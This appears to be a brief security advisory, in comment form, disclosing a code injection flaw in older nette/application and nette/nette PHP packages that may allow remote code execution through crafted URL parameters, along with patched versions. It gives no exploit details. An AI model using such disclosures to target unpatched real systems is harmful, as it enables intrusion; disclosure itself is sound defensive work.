# Packages nette/application versions prior to 2.2.10, 2.3.14, 2.4.16, 3.0.6
# and nette/nette versions prior to 2.0.19 and 2.1.13 are vulnerable to an
# code injection attack by passing specially formed parameters to URL that may possibly leading to RCE.
#
# Reported by Cyku Hong from DEVCORE (https://devco.re)
#
# Impact
# Code injection, possible remote code execution.
#
# Patches
# Fixed in nette/application 2.2.10, 2.3.14, 2.4.16, 3.0.6 and nette/nette 2.0.19 and 2.1.13
